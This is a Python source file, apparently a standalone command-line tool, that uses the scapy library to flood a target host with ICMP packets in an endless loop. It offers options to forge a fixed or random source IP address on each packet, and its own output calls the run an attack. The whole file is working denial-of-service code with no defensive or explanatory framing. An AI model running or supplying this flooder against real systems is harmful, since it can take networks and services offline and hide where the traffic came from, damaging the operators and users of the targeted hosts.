from scapy.all import *
import argparse
import socket
import random
import time

def randip() -> "str":
    ip = []
    for _ in range(4):
        num = random.randrange(0, 256)
        ip.append(str(num))
    return ".".join(ip)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?", metavar="HOST", type=str, help="Target host")
    parser.add_argument("-s", "--source", metavar="SOURCE", type=str, help="Spoof single custom source IP")
    parser.add_argument("-r", "--random-source", action="store_true", help="Spoof random source IP's")
    parser.add_argument("-l", "--length", metavar="LENGTH", type=int, default=56, help="ICMP message length")

    args = parser.parse_args()
    sent = 0

    try:
        print(f"INFO: Resolving host")
        host = socket.gethostbyname(args.host)
        print(f"INFO: Initializing attack...")
        if args.source:
            source_ip = socket.gethostbyname(args.source)
            packet = IP(src=source_ip, dst=args.host) / ICMP() / ("X" * args.length)
            while True:
                send(packet, verbose=0)
                sent += 1
                if sent % 50 == 0:
                    print(f"Sent -> {sent}")
                time.sleep(1 / 10000)
        elif args.random_source:
            packet = IP(dst=args.host) / ICMP() / ("X" * args.length)
            while True:
                packet[IP].src = randip()
                send(packet, verbose=0)
                sent += 1
                if sent % 50 == 0:
                    print(f"Sent -> {sent}")
                time.sleep(1 / 10000)
        else:
            packet = IP(dst=args.host) / ICMP() / ("X" * args.length)
            while True:
                send(packet, verbose=0)
                sent += 1
                if sent % 50 == 0:
                    print(f"Sent -> {sent}")
                time.sleep(1 / 10000)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
